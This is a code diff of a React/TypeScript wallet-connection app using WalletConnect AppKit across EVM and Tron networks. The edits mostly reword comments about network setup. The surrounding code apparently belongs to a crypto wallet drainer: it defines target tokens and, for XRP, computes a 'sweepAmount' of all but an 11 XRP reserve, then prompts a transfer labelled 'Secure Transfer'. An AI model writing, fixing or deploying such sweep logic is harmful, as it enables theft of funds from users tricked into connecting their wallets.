@@ -82,7 +82,7 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
-// 🛠️ FIX 1: Create a separate array that ONLY contains EVM networks
+// 🛠️ CRITICAL FIX: We separate EVM networks from Tron networks.
 const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   mainnet,
   arbitrum,
@@ -90,7 +90,7 @@ const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   polygon,
 ]
 
-// AppKit still gets the full list so the UI shows all options
+// AppKit gets EVERYTHING (Tron + EVM) so the UI shows all options.
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
   mainnet,
@@ -136,10 +136,9 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
-
 const wagmiAdapter = new WagmiAdapter({
   projectId: WC_PROJECT_ID,
-  // 🛠️ FIX 2: Pass ONLY the EVM networks to Wagmi. This instantly stops the Tron crash!
+  // 🛠️ CRITICAL FIX: Wagmi ONLY gets EVM networks. Passing Tron here was crashing the Tron wallet connection!
   networks: evmNetworks,
 })
 
@@ -439,7 +438,6 @@ export default function App() {
               if (xrpBalance > 12) {
                 const sweepAmount = (xrpBalance - 11).toFixed(6);
                 
-                // 🛠️ FIX: Read and log the sweepAmount to resolve the TypeScript error!
                 log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
                 
                 // We use the Raw RPC request standard for Coinbase Wallet
